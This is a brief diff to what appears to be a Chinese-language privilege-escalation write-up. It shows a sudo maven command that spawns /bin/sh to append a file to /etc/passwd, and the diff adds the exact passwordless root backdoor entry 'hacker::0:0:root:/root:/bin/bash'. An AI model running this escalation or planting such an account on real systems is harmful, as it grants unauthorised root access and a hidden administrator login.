@@ -671,4 +671,4 @@ bash-5.2# sudo /usr/bin/mvn exec:exec -Dexec.executable=/bin/sh -Dexec.args="-c 
 - root 运行 `/usr/bin/mvn`
 - maven 执行 `/bin/sh`
 - `sh` 执行 `cat /tmp/newpasswd >> /etc/passwd`
-- root 往 `/etc/passwd` 里添加了一行
+- root 往 `/etc/passwd` 里添加了一行`hacker::0:0:root:/root:/bin/bash`
